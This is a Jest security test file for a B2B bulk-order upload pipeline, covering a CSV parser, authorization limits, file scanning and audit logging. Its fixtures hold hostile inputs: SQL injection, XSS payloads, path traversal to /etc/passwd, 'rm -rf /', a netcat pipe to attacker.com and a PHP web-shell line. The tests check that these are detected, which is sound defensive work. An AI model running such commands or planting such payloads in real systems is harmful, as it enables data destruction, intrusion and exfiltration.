import { describe, it, expect, jest, beforeEach, afterEach } from '@jest/globals';
import { SecureCSVBulkOrderParser } from '../../bulk/secure-csv-parser';
import { B2BAuthorization, B2BPermission, type B2BUserContext } from '../b2b-authorization';
import { FileScanner } from '../file-scanner';
import { AuditLogger, AuditEventType } from '../audit-logger';
import type { BulkOrderRow } from '../../bulk/csv-parser';

describe('B2B Bulk Operations Security', () => {
  let secureParser: SecureCSVBulkOrderParser;
  let b2bAuth: B2BAuthorization;
  let fileScanner: FileScanner;
  let auditLogger: AuditLogger;

  beforeEach(() => {
    jest.clearAllMocks();
    secureParser = new SecureCSVBulkOrderParser();
    b2bAuth = new B2BAuthorization();
    fileScanner = new FileScanner();
    auditLogger = new AuditLogger({ enableConsoleOutput: false });
  });

  afterEach(async () => {
    await auditLogger.close();
  });

  describe('CSV Security Validation', () => {
    it('should detect SQL injection attempts in CSV', async () => {
      const maliciousCSV = `sku,quantity,notes
SKU-001,10,Normal order
SKU-002'; DROP TABLE orders; --,5,Malicious
SKU-003,20,Another order`;

      const result = await secureParser.parseStringSecure(maliciousCSV, 'user123', 'account123');

      expect(result.success).toBe(false);
      expect(result.securityThreats).toBeDefined();
      expect(result.securityThreats?.length).toBeGreaterThan(0);
      expect(result.securityThreats?.[0].threatType).toBe('sql_injection');
    });

    it('should detect script injection attempts', async () => {
      const maliciousCSV = `sku,quantity,notes
SKU-001,10,<script>alert('XSS')</script>
SKU-002,5,Normal note
SKU-003,20,<img src=x onerror=alert('XSS')>`;

      const result = await secureParser.parseStringSecure(maliciousCSV, 'user123', 'account123');

      expect(result.success).toBe(false);
      expect(result.securityThreats?.some(t => t.threatType === 'script_injection')).toBe(true);
    });

    it('should detect path traversal attempts', async () => {
      const maliciousCSV = `sku,quantity,notes
../../etc/passwd,10,Path traversal
SKU-002,5,Normal
C:\\Windows\\System32\\config,20,Windows path`;

      const result = await secureParser.parseStringSecure(maliciousCSV, 'user123', 'account123');

      expect(result.success).toBe(false);
      expect(result.securityThreats?.some(t => t.threatType === 'path_traversal')).toBe(true);
    });

    it('should detect command injection attempts', async () => {
      const maliciousCSV = `sku,quantity,notes
SKU-001,10,; rm -rf /
SKU-002,5,| nc attacker.com 4444
SKU-003,20,\`whoami\``;

      const result = await secureParser.parseStringSecure(maliciousCSV, 'user123', 'account123');

      expect(result.success).toBe(false);
      expect(result.securityThreats?.some(t => t.threatType === 'command_injection')).toBe(true);
    });

    it('should handle excessive field lengths', async () => {
      const longNote = 'A'.repeat(1000); // Exceeds 500 char limit
      const maliciousCSV = `sku,quantity,notes
SKU-001,10,${longNote}
SKU-002,5,Normal note`;

      const result = await secureParser.parseStringSecure(maliciousCSV, 'user123', 'account123');

      expect(result.success).toBe(false);
      expect(result.securityThreats?.some(t => t.threatType === 'excessive_length')).toBe(true);
    });

    it('should sanitize valid rows with minor issues', async () => {
      const csvWithMinorIssues = `sku,quantity,notes
SKU-001!@#,10,Order & notes
SKU_002,20,"Quote""test"""
SKU-003,30,<Normal>`;

      const result = await secureParser.parseStringSecure(csvWithMinorIssues, 'user123', 'account123');

      expect(result.success).toBe(true);
      expect(result.rows).toHaveLength(3);
      // Check sanitization
      expect(result.rows[0].sku).toBe('SKU-001');
      expect(result.rows[2].notes).toBe('&lt;Normal&gt;');
    });

    it('should reject binary data in CSV', async () => {
      const binaryCSV = Buffer.from([
        0x53, 0x4B, 0x55, 0x2C, 0x71, 0x75, 0x61, 0x6E, 0x74, 0x69, 0x74, 0x79, 0x0A,
        0x00, 0x00, 0x00, 0x00, // Null bytes
        0x53, 0x4B, 0x55, 0x2D, 0x30, 0x30, 0x31, 0x2C, 0x31, 0x30, 0x0A
      ]).toString();

      const result = await secureParser.parseStringSecure(binaryCSV, 'user123', 'account123');

      expect(result.success).toBe(false);
      expect(result.securityThreats?.some(t => t.threatType === 'invalid_encoding')).toBe(true);
    });
  });

  describe('B2B Authorization', () => {
    it('should enforce permission requirements', async () => {
      const userContext: B2BUserContext = {
        userId: 'user123',
        accountId: 'account123',
        role: 'BUYER',
        permissions: [] // No bulk order permission
      };

      const hasPermission = b2bAuth.hasPermission(userContext, B2BPermission.BULK_ORDER_CREATE);
      expect(hasPermission).toBe(false);
    });

    it('should enforce order value limits', async () => {
      const userContext: B2BUserContext = {
        userId: 'user123',
        accountId: 'account123',
        role: 'BUYER',
        permissions: [B2BPermission.BULK_ORDER_CREATE],
        customLimits: {
          singleOrderValue: 5000
        }
      };

      const result = await b2bAuth.authorizeBulkOperation(userContext, {
        type: 'create',
        orderValue: 10000, // Exceeds limit
        itemCount: 50,
        items: []
      });

      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('exceeds single order limit');
      expect(result.currentLimit).toBe(5000);
    });

    it('should enforce item count limits', async () => {
      const userContext: B2BUserContext = {
        userId: 'user123',
        accountId: 'account123',
        role: 'BUYER',
        permissions: [B2BPermission.BULK_ORDER_CREATE],
        customLimits: {
          singleOrderItems: 100
        }
      };

      const result = await b2bAuth.authorizeBulkOperation(userContext, {
        type: 'create',
        orderValue: 1000,
        itemCount: 200, // Exceeds limit
        items: []
      });

      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('exceeds single order limit');
      expect(result.currentLimit).toBe(100);
    });

    it('should validate SKU patterns', async () => {
      const userContext: B2BUserContext = {
        userId: 'user123',
        accountId: 'account123',
        role: 'BUYER',
        permissions: [B2BPermission.BULK_ORDER_CREATE]
      };

      // Mock B2B SKU pattern
      process.env.B2B_SKU_PATTERN = '^[A-Z]{3}-[0-9]{3}$';

      const result = await b2bAuth.validateSKUPatterns(userContext, [
        'SKU-001', // Valid
        'SKU-002', // Valid
        'invalid-sku-123', // Invalid
        'ABC123' // Invalid
      ]);

      expect(result.valid).toBe(false);
      expect(result.invalidSKUs).toHaveLength(2);
      expect(result.invalidSKUs).toContain('invalid-sku-123');
      expect(result.invalidSKUs).toContain('ABC123');

      delete process.env.B2B_SKU_PATTERN;
    });

    it('should check credit limits', async () => {
      const userContext: B2BUserContext = {
        userId: 'user123',
        accountId: 'account123',
        role: 'BUYER',
        permissions: [B2BPermission.VIEW_CREDIT_LIMIT]
      };

      const result = await b2bAuth.checkCreditLimit(
        userContext,
        5000, // Order value
        45000, // Current credit used
        50000 // Credit limit
      );

      expect(result.allowed).toBe(false);
      expect(result.reason).toBe('Insufficient credit available');
      expect(result.currentLimit).toBe(5000);
    });

    it('should allow unlimited permission to bypass limits', async () => {
      const userContext: B2BUserContext = {
        userId: 'admin123',
        accountId: 'account123',
        role: 'ACCOUNT_ADMIN',
        permissions: [
          B2BPermission.BULK_ORDER_CREATE,
          B2BPermission.BULK_ORDER_UNLIMITED
        ],
        customLimits: {
          singleOrderValue: 1000 // Should be bypassed
        }
      };

      const result = await b2bAuth.authorizeBulkOperation(userContext, {
        type: 'create',
        orderValue: 100000, // Way over normal limit
        itemCount: 5000,
        items: []
      });

      expect(result.allowed).toBe(true);
    });
  });

  describe('File Security Scanning', () => {
    it('should detect executable files', async () => {
      // Windows executable signature
      const exeFile = new File(
        [Buffer.from('MZ\x90\x00\x03\x00\x00\x00')],
        'malware.csv',
        { type: 'text/csv' }
      );

      const result = await fileScanner.scanFile(exeFile, 'malware.csv', 'user123');

      expect(result.safe).toBe(false);
      expect(result.threats.some(t => t.description.includes('executable'))).toBe(true);
    });

    it('should detect PHP scripts', async () => {
      const phpFile = new File(
        ['<?php system($_GET["cmd"]); ?>'],
        'backdoor.csv',
        { type: 'text/csv' }
      );

      const result = await fileScanner.scanFile(phpFile, 'backdoor.csv', 'user123');

      expect(result.safe).toBe(false);
      expect(result.threats.some(t => t.description.includes('PHP script'))).toBe(true);
    });

    it('should detect EICAR test virus', async () => {
      const eicarFile = new File(
        ['X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'],
        'eicar.csv',
        { type: 'text/csv' }
      );

      const result = await fileScanner.scanFile(eicarFile, 'eicar.csv', 'user123');

      expect(result.safe).toBe(false);
      expect(result.threats.some(t => t.type === 'malware')).toBe(true);
    });

    it('should validate file size limits', async () => {
      const largeFile = new File(
        [Buffer.alloc(10 * 1024 * 1024)], // 10MB
        'large.csv',
        { type: 'text/csv' }
      );

      const scanner = new FileScanner({ maxFileSizeMB: 5 });
      const result = await scanner.scanFile(largeFile, 'large.csv', 'user123');

      expect(result.safe).toBe(false);
      expect(result.threats.some(t => t.type === 'oversized')).toBe(true);
    });

    it('should validate allowed file types', async () => {
      const jsonFile = new File(
        ['{"sku": "SKU-001", "quantity": 10}'],
        'order.json',
        { type: 'application/json' }
      );

      const result = await fileScanner.scanFile(jsonFile, 'order.json', 'user123');

      expect(result.safe).toBe(false);
      expect(result.threats.some(t => t.type === 'invalid_type')).toBe(true);
    });

    it('should detect high entropy (encrypted) content', async () => {
      // Generate high entropy data
      const encrypted = Buffer.from(
        Array(1024).fill(0).map(() => Math.floor(Math.random() * 256))
      );
      
      const encryptedFile = new File(
        [encrypted],
        'encrypted.csv',
        { type: 'text/csv' }
      );

      const result = await fileScanner.scanFile(encryptedFile, 'encrypted.csv', 'user123');

      expect(result.safe).toBe(false);
      expect(result.threats.some(t => t.type === 'encrypted')).toBe(true);
    });

    it('should generate safe storage paths', () => {
      const path = fileScanner.generateSafeStoragePath(
        '../../../etc/passwd.csv',
        'user123'
      );

      expect(path).toMatch(/^uploads\/user123\/\d+-[a-z0-9]+-.*passwd\.csv$/);
      expect(path).not.toContain('..');
    });
  });

  describe('Audit Logging', () => {
    it('should log security events with integrity protection', async () => {
      const logId = await auditLogger.logSecurityEvent(
        AuditEventType.MALICIOUS_PAYLOAD_DETECTED,
        {
          userId: 'user123',
          ipAddress: '192.168.1.100',
          action: 'csv_upload',
          threatDetails: {
            type: 'sql_injection',
            payload: "'; DROP TABLE orders; --"
          },
          blocked: true
        }
      );

      expect(logId).toBeDefined();
      
      // Verify log integrity
      const integrity = await auditLogger.verifyIntegrity();
      expect(integrity.valid).toBe(true);
    });

    it('should create tamper-proof audit trail', async () => {
      // Log multiple events
      const events = [
        { type: AuditEventType.AUTH_SUCCESS, userId: 'user1' },
        { type: AuditEventType.BULK_UPLOAD_START, userId: 'user1' },
        { type: AuditEventType.BULK_UPLOAD_SUCCESS, userId: 'user1' }
      ];

      for (const event of events) {
        await auditLogger.logEvent(event.type, {
          userId: event.userId,
          action: 'test',
          result: 'success'
        });
      }

      // Verify integrity
      const integrity = await auditLogger.verifyIntegrity();
      expect(integrity.valid).toBe(true);
      expect(integrity.entriesChecked).toBe(3);
    });

    it('should generate compliance reports', async () => {
      // Log various security events
      await auditLogger.logEvent(AuditEventType.AUTH_FAILURE, {
        action: 'login',
        result: 'failure'
      });

      await auditLogger.logEvent(AuditEventType.RATE_LIMIT_EXCEEDED, {
        ipAddress: '192.168.1.100',
        action: 'bulk_upload',
        result: 'failure'
      });

      const endDate = new Date();
      const startDate = new Date(endDate.getTime() - 24 * 60 * 60 * 1000);
      
      const report = await auditLogger.generateComplianceReport(startDate, endDate);

      expect(report.summary.totalEvents).toBeGreaterThanOrEqual(2);
      expect(report.summary.failedAuthentications).toBe(1);
      expect(report.summary.rateLimitViolations).toBe(1);
      expect(report.integrityCheck.valid).toBe(true);
    });
  });

  describe('Integration Tests', () => {
    it('should handle complete secure bulk upload flow', async () => {
      const validCSV = `sku,quantity,notes
SKU-001,10,Regular order
SKU-002,25,Priority order
SKU-003,100,Bulk discount eligible`;

      const userContext: B2BUserContext = {
        userId: 'user123',
        accountId: 'account123',
        role: 'BUYER',
        permissions: [B2BPermission.BULK_ORDER_CREATE]
      };

      // 1. Parse CSV securely
      const parseResult = await secureParser.parseStringSecure(
        validCSV,
        userContext.userId,
        userContext.accountId
      );
      expect(parseResult.success).toBe(true);
      expect(parseResult.rows).toHaveLength(3);

      // 2. Validate SKU patterns
      const skuValidation = await b2bAuth.validateSKUPatterns(
        userContext,
        parseResult.rows.map(r => r.sku)
      );
      expect(skuValidation.valid).toBe(true);

      // 3. Check authorization
      const authResult = await b2bAuth.authorizeBulkOperation(userContext, {
        type: 'create',
        orderValue: 1000,
        itemCount: parseResult.rows.length,
        items: []
      });
      expect(authResult.allowed).toBe(true);

      // 4. Log success
      await auditLogger.logEvent(AuditEventType.BULK_UPLOAD_SUCCESS, {
        userId: userContext.userId,
        accountId: userContext.accountId,
        action: 'bulk_order.complete',
        result: 'success',
        affectedRecords: parseResult.rows.length
      });
    });

    it('should block malicious bulk upload attempts', async () => {
      const maliciousCSV = `sku,quantity,notes
SKU-001,10,Normal
SKU-002'; DELETE FROM orders WHERE 1=1; --,5,Attack
SKU-003,20,<script>alert('XSS')</script>`;

      // Should fail at parsing stage
      const parseResult = await secureParser.parseStringSecure(
        maliciousCSV,
        'attacker123',
        'account123'
      );

      expect(parseResult.success).toBe(false);
      expect(parseResult.securityThreats).toBeDefined();
      expect(parseResult.securityThreats?.length).toBeGreaterThan(0);

      // Verify security event was logged
      const logs = await auditLogger.queryLogs({
        userId: 'attacker123',
        eventType: AuditEventType.MALICIOUS_PAYLOAD_DETECTED
      });

      expect(logs.length).toBeGreaterThan(0);
    });
  });
});